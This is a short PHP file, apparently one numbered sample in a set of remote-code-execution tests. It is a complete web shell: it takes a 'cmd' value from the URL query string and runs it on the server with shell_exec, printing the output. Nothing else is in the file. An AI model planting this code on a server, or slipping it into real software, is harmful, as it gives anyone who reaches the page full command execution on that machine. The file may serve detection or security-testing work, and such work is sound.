<?php
// RCE test variation #1296
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>